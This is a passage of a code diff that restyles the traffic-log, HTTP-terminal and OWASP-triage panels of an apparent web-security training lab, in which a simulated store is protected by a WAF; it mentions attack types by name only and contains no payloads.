+                            <p className="text-xs text-slate-400">{doc.snippet}</p>
                           </div>
                         ))}
                       </div>
@@ -2187,10 +2334,10 @@ export function WebLabTab({
             </div>
 
             {/* In-Browser Footer */}
-            <div className="border-t border-border/40 bg-muted/30 px-5 py-2.5 flex items-center justify-between text-[10px] text-muted-foreground">
+            <div className="border-t border-slate-800/80 bg-[#080d1a] px-5 py-2.5 flex items-center justify-between text-[10px] text-slate-400">
               <span>© 2026 Apex CyberStore Systems · Protected by WebGuard AI WAF</span>
               <span className="flex items-center gap-1 font-mono">
-                Engine: <span className="text-cyan-400 font-bold">FastAPI Proxy (Port 8000)</span>
+                Reverse Proxy Target: <span className="text-cyan-400 font-bold">http://127.0.0.1:8080</span>
               </span>
             </div>
           </div>
@@ -2206,7 +2353,7 @@ export function WebLabTab({
               {[
                 { id: "visual" as const, label: "Live Traffic", icon: <Globe2 className="size-3.5" /> },
                 { id: "http" as const, label: "HTTP Terminal", icon: <Terminal className="size-3.5" /> },
-                { id: "analysis" as const, label: "Attack Triage", icon: <Bug className="size-3.5" /> },
+                { id: "analysis" as const, label: "OWASP Triage", icon: <Bug className="size-3.5" /> },
               ].map((t) => (
                 <button
                   key={t.id}
@@ -2215,8 +2362,8 @@ export function WebLabTab({
                   className={cn(
                     "flex items-center gap-1.5 rounded-xl border px-3 py-1.5 text-xs font-bold transition-all",
                     responseTab === t.id
-                      ? "border-cyan-500/50 bg-cyan-500/15 text-cyan-400 shadow-sm"
-                      : "border-border/40 text-muted-foreground hover:text-foreground hover:bg-muted/40"
+                      ? "border-cyan-500/50 bg-cyan-500/20 text-cyan-300 shadow-sm"
+                      : "border-slate-800 bg-[#0d1424] text-slate-400 hover:text-white hover:bg-slate-800"
                   )}
                 >
                   {t.icon} {t.label}
@@ -2227,7 +2374,7 @@ export function WebLabTab({
             <Button
               variant="ghost"
               size="sm"
-              className="h-7 text-[10px] text-muted-foreground hover:text-foreground"
+              className="h-7 text-[10px] text-slate-400 hover:text-white"
               onClick={() => {
                 setLogs([]);
                 setLastResult(null);
@@ -2240,20 +2387,20 @@ export function WebLabTab({
 
           {/* Tab 1: Live Traffic Log */}
           {responseTab === "visual" && (
-            <div className="wg-panel flex min-h-[520px] max-h-[720px] flex-col overflow-hidden p-0 rounded-2xl border border-border/60 bg-card">
-              <div className="flex items-center justify-between border-b border-border/40 bg-muted/40 px-4 py-2.5">
-                <span className="text-xs font-bold text-foreground flex items-center gap-1.5">
+            <div className="flex min-h-[520px] max-h-[700px] flex-col overflow-hidden p-0 rounded-2xl border border-slate-700/70 bg-[#0a0f1d] text-slate-100 shadow-2xl">
+              <div className="flex items-center justify-between border-b border-slate-800 bg-[#0d1527] px-4 py-2.5">
+                <span className="text-xs font-bold text-white flex items-center gap-1.5">
                   <Globe2 className="size-4 text-cyan-400" /> Intercepted HTTP Exchanges ({logs.length / 2})
                 </span>
-                <span className="text-[10px] text-muted-foreground font-mono">Edge Pipeline</span>
+                <span className="text-[10px] text-slate-400 font-mono">Edge Pipeline</span>
               </div>
 
               <div className="flex-1 overflow-y-auto p-3.5 space-y-3">
                 {logs.length === 0 ? (
-                  <div className="flex flex-col items-center justify-center py-24 text-center gap-2">
-                    <Globe2 className="size-10 text-muted-foreground/30" />
-                    <p className="text-xs font-semibold text-muted-foreground">Waiting for website traffic...</p>
-                    <p className="text-[10px] text-muted-foreground/70 max-w-xs">
+                  <div className="flex flex-col items-center justify-center py-28 text-center gap-2">
+                    <Globe2 className="size-10 text-slate-600" />
+                    <p className="text-xs font-semibold text-slate-300">Waiting for website traffic...</p>
+                    <p className="text-[10px] text-slate-500 max-w-xs">
                       Interact with the store on the left (search, review, ping, IDOR order lookup) to see real-time
                       packet inspection.
                     </p>
@@ -2263,12 +2410,12 @@ export function WebLabTab({
                     <div
                       key={log.id}
                       className={cn(
-                        "rounded-xl border p-3 text-xs space-y-2 transition-all",
+                        "rounded-xl border p-3 text-xs space-y-2 transition-all shadow-sm",
                         log.type === "request"
-                          ? "border-cyan-500/30 bg-cyan-500/[0.03]"
+                          ? "border-cyan-500/30 bg-cyan-950/20"
                           : log.type === "waf"
-                          ? "border-emerald-500/40 bg-emerald-500/[0.05]"
-                          : "border-red-500/30 bg-red-500/[0.04]"
+                          ? "border-emerald-500/40 bg-emerald-950/30"
+                          : "border-red-500/30 bg-red-950/20"
                       )}
                     >
                       <div className="flex items-center gap-2">
@@ -2276,27 +2423,27 @@ export function WebLabTab({
                           className={cn(
                             "rounded px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wider",
                             log.type === "request"
-                              ? "bg-cyan-500/20 text-cyan-400"
+                              ? "bg-cyan-500/20 text-cyan-300"
                               : log.type === "waf"
-                              ? "bg-emerald-500/20 text-emerald-400"
-                              : "bg-red-500/20 text-red-400"
+                              ? "bg-emerald-500/20 text-emerald-300"
+                              : "bg-red-500/20 text-red-300"
                           )}
                         >
                           {log.type === "request" ? "→ INGRESS" : log.type === "waf" ? "🛡️ WAF 403" : "← EGRESS"}
                         </span>
                         {log.method && (
-                          <span className="font-mono text-[10px] font-bold text-foreground">{log.method}</span>
+                          <span className="font-mono text-[10px] font-bold text-white">{log.method}</span>
                         )}
-                        {log.path && <span className="font-mono text-[10px] text-muted-foreground truncate">{log.path}</span>}
+                        {log.path && <span className="font-mono text-[10px] text-slate-300 truncate">{log.path}</span>}
                         {log.threatScore !== undefined && (
                           <span
                             className={cn(
                               "ml-auto font-mono text-[9px] font-bold px-1.5 py-0.5 rounded",
                               log.threatScore > 70
-                                ? "bg-red-500/20 text-red-400"
+                                ? "bg-red-500/20 text-red-300"
                                 : log.threatScore > 30
-                                ? "bg-amber-500/20 text-amber-400"
-                                : "bg-emerald-500/20 text-emerald-400"
+                                ? "bg-amber-500/20 text-amber-300"
+                                : "bg-emerald-500/20 text-emerald-300"
                             )}
                           >
                             Score: {log.threatScore}/100
@@ -2305,14 +2452,14 @@ export function WebLabTab({
                       </div>
 
                       {log.body && (
-                        <pre className="max-h-20 overflow-x-auto rounded bg-black/40 p-2 font-mono text-[10px] text-foreground/75 whitespace-pre-wrap">
+                        <pre className="max-h-20 overflow-x-auto rounded bg-black/60 p-2 font-mono text-[10px] text-slate-300 whitespace-pre-wrap border border-slate-800">
                           {log.body}
                         </pre>
                       )}
 
                       {log.vulnId && VULN_DEFS[log.vulnId] && (
-                        <div className="flex items-center justify-between border-t border-border/30 pt-1.5 text-[10px]">
-                          <span className="text-muted-foreground font-semibold">
+                        <div className="flex items-center justify-between border-t border-slate-800 pt-1.5 text-[10px]">
+                          <span className="text-slate-400 font-semibold">
                             CWE: {VULN_DEFS[log.vulnId].cwe} · {VULN_DEFS[log.vulnId].label}
                           </span>
                           <span
@@ -2335,21 +2482,21 @@ export function WebLabTab({
 
           {/* Tab 2: Raw HTTP Terminal Stream */}
           {responseTab === "http" && (
-            <div className="wg-panel flex min-h-[520px] max-h-[720px] flex-col overflow-hidden p-0 rounded-2xl border border-border/60 bg-[#070b12]">
-              <div className="flex items-center justify-between border-b border-border/40 bg-muted/20 px-4 py-2.5">
+            <div className="flex min-h-[520px] max-h-[700px] flex-col overflow-hidden p-0 rounded-2xl border border-slate-700/70 bg-[#070b14] text-slate-100 shadow-2xl">
+              <div className="flex items-center justify-between border-b border-slate-800 bg-[#0a0f1d] px-4 py-2.5">
                 <span className="text-xs font-mono font-bold text-cyan-400 flex items-center gap-1.5">
                   <Terminal className="size-3.5" /> Socket Stream Inspector
                 </span>
-                <span className="text-[10px] text-muted-foreground font-mono">HTTP/1.1 Edge</span>
+                <span className="text-[10px] text-slate-400 font-mono">HTTP/1.1 Edge</span>
               </div>
 
-              <div className="flex-1 overflow-y-auto p-4 font-mono text-[11px] leading-relaxed text-foreground/80 space-y-4">
+              <div className="flex-1 overflow-y-auto p-4 font-mono text-[11px] leading-relaxed text-slate-300 space-y-4">
                 {logs.length === 0 ? (
-                  <span className="text-muted-foreground/40"># No packets logged yet.</span>
+                  <span className="text-slate-600"># No packets logged yet.</span>
                 ) : (
                   logs.map((log) => (
-                    <div key={log.id} className="border-b border-border/20 pb-3">
-                      <p className="text-[9px] text-muted-foreground/60 mb-1">
+                    <div key={log.id} className="border-b border-slate-800 pb-3">
+                      <p className="text-[9px] text-slate-500 mb-1">
                         ─── {new Date(log.ts).toLocaleTimeString()} ───
                       </p>
                       {log.type === "request" && (
@@ -2357,24 +2504,24 @@ export function WebLabTab({
                           <p className="text-cyan-400 font-bold">
                             → {log.method} {log.path} HTTP/1.1
                           </p>
-                          <p className="text-muted-foreground">Host: apex-cyberstore.io</p>
-                          <p className="text-muted-foreground">User-Agent: Mozilla/5.0 (Windows NT 10.0)</p>
+                          <p className="text-slate-400">Host: apex-cyberstore.io</p>
+                          <p className="text-slate-400">User-Agent: Mozilla/5.0 (Windows NT 10.0)</p>
                           {log.body && <p className="text-emerald-400 mt-1 font-semibold">{log.body}</p>}
                         </>
                       )}
                       {log.type === "waf" && (
                         <>
                           <p className="text-emerald-400 font-bold">← HTTP/1.1 403 Forbidden (WAF Intercept)</p>
-                          <p className="text-muted-foreground">X-WebGuard-Rule: {log.vulnId?.toUpperCase()}</p>
-                          <p className="text-muted-foreground">X-WebGuard-Action: BLOCKED_AT_EDGE</p>
+                          <p className="text-slate-400">X-WebGuard-Rule: {log.vulnId?.toUpperCase()}</p>
+                          <p className="text-slate-400">X-WebGuard-Action: BLOCKED_AT_EDGE</p>
                           <p className="text-emerald-300 mt-1">{log.body?.slice(0, 160)}...</p>
                         </>
                       )}
                       {log.type === "response" && (
                         <>
                           <p className="text-red-400 font-bold">← HTTP/1.1 {log.status} OK (Backend Response)</p>
-                          <p className="text-muted-foreground">Server: Uvicorn/FastAPI (Port 8080)</p>
-                          <p className="text-muted-foreground">Content-Type: application/json</p>
+                          <p className="text-slate-400">Server: Uvicorn/FastAPI (Port 8080)</p>
+                          <p className="text-slate-400">Content-Type: application/json</p>
                           <p className="text-red-300 mt-1">{log.body?.slice(0, 160)}...</p>
                         </>
                       )}
@@ -2385,30 +2532,29 @@ export function WebLabTab({
             </div>
           )}
 
-          {/* Tab 3: Attack Triage & Virtual Patching */}
+          {/* Tab 3: OWASP Attack Triage */}
           {responseTab === "analysis" && (
-            <div className="wg-panel flex min-h-[520px] max-h-[720px] flex-col overflow-hidden p-4 rounded-2xl border border-border/60 bg-card space-y-4">
-              <h3 className="text-xs font-bold uppercase tracking-wider text-muted-foreground flex items-center gap-1.5">
+            <div className="flex min-h-[520px] max-h-[700px] flex-col overflow-hidden p-4 rounded-2xl border border-slate-700/70 bg-[#0a0f1d] text-slate-100 shadow-2xl space-y-4">
+              <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1.5">
                 <Bug className="size-4 text-red-400" /> OWASP Threat Classification & Virtual Patch
               </h3>
 
               {!lastResult || !lastResult.vulnId ? (
-                <div className="flex flex-col items-center justify-center py-20 text-center gap-2">
-                  <Bug className="size-10 text-muted-foreground/30" />
-                  <p className="text-xs text-muted-foreground">No recent exploit analyzed.</p>
-                  <p className="text-[10px] text-muted-foreground/70">
+                <div className="flex flex-col items-center justify-center py-28 text-center gap-2">
+                  <Bug className="size-10 text-slate-600" />
+                  <p className="text-xs text-slate-400">No recent exploit analyzed.</p>
+                  <p className="text-[10px] text-slate-500">
                     Trigger an attack (SQLi, XSS, CMDi) from the store to inspect the vulnerability defense breakdown.
                   </p>
                 </div>
               ) : (
                 <div className="space-y-4 overflow-y-auto pr-1">
-                  {/* Verdict Badge */}
                   <div
                     className={cn(
                       "rounded-2xl border-2 p-4 flex items-center gap-3",
                       lastResult.blocked
-                        ? "border-emerald-500/50 bg-emerald-500/[0.08]"
-                        : "border-red-500/50 bg-red-500/[0.08]"
+                        ? "border-emerald-500/50 bg-emerald-950/40"
+                        : "border-red-500/50 bg-red-950/40"
                     )}
                   >
                     {lastResult.blocked ? (
@@ -2420,22 +2566,21 @@ export function WebLabTab({
                       <h4
                         className={cn(
                           "text-sm font-extrabold",
-                          lastResult.blocked ? "text-emerald-400" : "text-red-400"
+                          lastResult.blocked ? "text-emerald-300" : "text-red-300"
                         )}
                       >
                         {lastResult.blocked ? "🛡️ Attack Dropped by WebGuard Edge" : "⚠️ Vulnerability Exploited!"}
                       </h4>
-                      <p className="text-xs text-muted-foreground">
+                      <p className="text-xs text-slate-300">
                         {VULN_DEFS[lastResult.vulnId]?.label || "Custom Attack"}
                       </p>
                     </div>
                   </div>
 
-                  {/* Vulnerability Meta */}
                   {VULN_DEFS[lastResult.vulnId] && (
-                    <div className="rounded-2xl border border-border/50 bg-muted/20 p-4 space-y-2.5 text-xs">
+                    <div className="rounded-2xl border border-slate-800 bg-[#0d1424] p-4 space-y-2.5 text-xs">
                       <div className="flex items-center justify-between">
-                        <span className="font-bold text-foreground">{VULN_DEFS[lastResult.vulnId].label}</span>
+                        <span className="font-bold text-white">{VULN_DEFS[lastResult.vulnId].label}</span>
                         <span
                           className={cn(
                             "rounded-full px-2 py-0.5 text-[9px] font-bold",
@@ -2445,16 +2590,15 @@ export function WebLabTab({
                           {SEVERITY_META[VULN_DEFS[lastResult.vulnId].severity].label}
                         </span>
                       </div>
-                      <p className="text-muted-foreground text-[11px] leading-relaxed">
+                      <p className="text-slate-300 text-[11px] leading-relaxed">
                         {VULN_DEFS[lastResult.vulnId].description}
                       </p>
-                      <div className="flex gap-4 text-[10px] text-muted-foreground font-semibold">
+                      <div className="flex gap-4 text-[10px] text-slate-400 font-semibold">
                         <span>CWE: {VULN_DEFS[lastResult.vulnId].cwe}</span>
                         <span>OWASP: {VULN_DEFS[lastResult.vulnId].owasp}</span>
                       </div>
 
-                      {/* Virtual Patch Box */}
-                      <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/[0.05] p-3 space-y-1">
+                      <div className="rounded-xl border border-emerald-500/40 bg-emerald-950/30 p-3 space-y-1">
                         <p className="text-[10px] font-bold text-emerald-400 uppercase tracking-wider">
                           🛡️ WebGuard Virtual Patch Policy:
                         </p>
